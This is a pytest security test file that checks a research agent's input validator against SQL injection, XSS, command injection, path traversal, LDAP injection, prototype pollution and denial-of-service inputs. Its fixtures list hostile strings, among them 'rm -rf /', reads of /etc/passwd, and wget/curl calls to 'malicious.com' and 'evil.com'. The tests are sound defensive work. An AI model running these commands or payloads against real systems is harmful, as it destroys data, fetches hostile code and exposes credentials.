"""
Security and injection attack tests for Deep Research Agent.

Tests protection against various security threats and malicious inputs.
"""

import pytest
from unittest.mock import patch, Mock
from pathlib import Path

from utils.validators import InputValidator, ValidationError
from utils.session_manager import SessionManager
from core.conversation import ConversationHandler


@pytest.mark.priority1
@pytest.mark.security
@pytest.mark.regression
class TestSecurityValidation:
    """Test cases for security vulnerabilities and attack prevention."""
    
    @pytest.fixture
    def validator(self, mock_settings):
        """Create a validator instance for testing."""
        return InputValidator(mock_settings)
    
    def test_sql_injection_prevention(self, validator):
        """Test prevention of SQL injection attempts."""
        sql_injection_attempts = [
            "'; DROP TABLE sessions; --",
            "' OR 1=1; --",
            "' UNION SELECT * FROM users; --",
            "'; INSERT INTO sessions VALUES ('malicious'); --",
            "' OR 'a'='a"
        ]

        for malicious_input in sql_injection_attempts:
            # Should sanitize dangerous SQL characters
            result = validator.sanitize_string(malicious_input)
            assert "'" not in result
            assert "--" not in result
            assert "drop" not in result.lower()
            assert "select" not in result.lower()
            assert "insert" not in result.lower()

    def test_xss_attack_prevention(self, validator):
        """Test prevention of Cross-Site Scripting (XSS) attacks."""
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for malicious_input in xss_attacks:
            result = validator.sanitize_string(malicious_input)
            # Verify dangerous characters are removed
            assert "<" not in result
            assert ">" not in result
            assert "'" not in result
            assert '"' not in result
            # But content should remain (without dangerous parts)
            assert "alert" in result
            assert "script" not in result.lower()
            assert "onerror" not in result.lower()
            assert "onload" not in result.lower()

    def test_command_injection_prevention(self, validator):
        """Test prevention of command injection attacks."""
        command_injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`curl evil.com`",
            "$(rm important_file.txt)",
            "; python -c 'malicious code'",
            "& del C:\\Windows\\System32",
            "|| format C:"
        ]
        
        for malicious_input in command_injection_attempts:
            result = validator.sanitize_string(malicious_input)
            # Verify command injection characters are handled
            dangerous_chars = [";", "|", "&", "`", "$", "\\"]
            for char in dangerous_chars:
                if char in malicious_input:
                    assert char not in result
            assert "rm -rf" not in result
            assert "wget" not in result
            assert "curl" not in result
            assert "del C:" not in result

    def test_path_traversal_prevention(self, validator):
        """Test prevention of directory traversal attacks."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "C:\\Windows\\System32\\",
            "~/.ssh/id_rsa",
            "../../root/.bashrc",
            "../config/database.yml",
            "file:///etc/passwd"
        ]

        for malicious_path in path_traversal_attempts:
            with pytest.raises(ValidationError):
                validator.validate_file_path(malicious_path, project_root=Path("/app"))

    def test_ldap_injection_prevention(self, validator):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_attempts = [
            "admin)(&(password=*))",
            "admin)(|(password=*))",
            "*)(uid=*))(|(uid=*",
            "admin)(!(&(1=0)))",
            ")(cn=*"
        ]
        
        for malicious_input in ldap_injection_attempts:
            result = validator.sanitize_string(malicious_input)
            # LDAP special characters should be handled
            assert "(" not in result
            assert ")" not in result
            assert "*" not in result
            assert "&" not in result
            assert "|" not in result

    def test_regex_dos_prevention(self, validator):
        """Test prevention of Regex Denial-of-Service (ReDoS) attacks."""
        # Exponential time complexity patterns
        redos_patterns = [
            "a" * 50000 + "X",  # Very long string that doesn't match
            "(" * 1000 + "a" + ")" * 1000,  # Nested groups
        ]
        
        for pattern in redos_patterns:
            # Should handle gracefully without hanging
            result = validator.sanitize_string(pattern, max_length=1000)
            # Should be truncated to prevent DoS
            assert len(result) <= 1000
    
    def test_session_id_tampering_prevention(self, validator):
        """Test prevention of session ID tampering."""
        tampered_session_ids = [
            "DRA_20250628_120000; DELETE FROM sessions",
            "DRA_20250628_120000' OR 1=1",
            "../../../DRA_20250628_120000",
            "DRA_20250628_120000<script>alert('xss')</script>",
            "DRA_$(rm -rf /)_120000"
        ]
        
        for tampered_id in tampered_session_ids:
            with pytest.raises(ValidationError):
                validator.validate_session_id(tampered_id)
    
    def test_large_payload_dos_prevention(self, validator):
        """Test prevention of large payload DoS attacks."""
        # Very large inputs to cause memory exhaustion
        large_payloads = [
            "A" * (10 * 1024 * 1024),  # 10MB string
            {"key" + str(i): "value" * 1000 for i in range(10000)},  # Large dict
            ["item" * 100] * 10000,  # Large list
        ]
        
        # String payload
        result = validator.sanitize_string(large_payloads[0], max_length=1000)
        assert len(result) == 1000  # Should be truncated

        # Dict payload
        with pytest.raises(ValidationError):
            validator.validate_personalization_data(large_payloads[1])

        # List payload
        with pytest.raises(ValidationError):
            validator.validate_personalization_data({"key": large_payloads[2]})

    def test_unicode_attack_prevention(self, validator):
        """Test prevention of unicode normalization attacks."""
        unicode_attacks = [
            "\u202e\u0041\u070f",  # Right-to-left override
            "\ufeff",  # Byte order mark
            "\u0000",  # Null character
            "\u200b\u200c\u200d",  # Zero-width characters
            "𝕒𝕕𝕞𝕚𝕟",  # Mathematical alphanumeric symbols
            "𝒶𝒹𝓂𝒾𝓃",  # Script variants
        ]
        
        for unicode_attack in unicode_attacks:
            result = validator.sanitize_string(unicode_attack)
            # Should handle gracefully (convert to safe representation)
            assert len(result) <= len(unicode_attack) * 2  # Reasonable bound
    
    def test_session_file_security(self, mock_settings, tmp_path):
        """Test session file access security."""
        mock_settings.session_storage_path = str(tmp_path / "sessions")
        session_manager = SessionManager(mock_settings)
    
        # Test that session files are created with proper permissions
        session_data = {
            "session_id": "DRA_20250628_120000",
            "query": "test query",
            "context": {},
            "status": "created"
        }
    
        with patch.object(session_manager.validator, 'validate_session_id', return_value="DRA_20250628_120000"):
            session_manager.save_session(session_data)
    
            session_file = tmp_path / "sessions" / "DRA_20250628_120000.json"
            assert session_file.exists()
    
            # Check file permissions (should not be world-readable)
            import stat
            file_mode = session_file.stat().st_mode
            # Should not have world-read or group-read permissions
            assert not (file_mode & stat.S_IRWXG)
            assert not (file_mode & stat.S_IRWXO)

    def test_input_validation_bypass_attempts(self, validator):
        """Test attempts to bypass input validation."""
        bypass_attempts = [
            "normal text\x00hidden content",  # Null byte injection
            "good input\rmalicious\r\n",      # CRLF injection
            "test\033[2J\033[H",               # ANSI escape sequences
            "normal\u2028hidden\u2029",       # Unicode line separators
            "text\x08\x08\x08hack",           # Backspace manipulation
        ]
        
        for bypass_attempt in bypass_attempts:
            result = validator.sanitize_string(bypass_attempt)
            # Should clean up control characters
            assert "\x00" not in result
            assert "\r" not in result
            assert "\n" not in result
            assert "\033" not in result

    def test_prototype_pollution_prevention(self, validator):
        """Test prevention of prototype pollution in data validation."""
        pollution_attempts = [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"__proto__.isAdmin": True},
        ]
        
        for attempt in pollution_attempts:
            with pytest.raises(ValidationError):
                validator.validate_personalization_data(attempt)
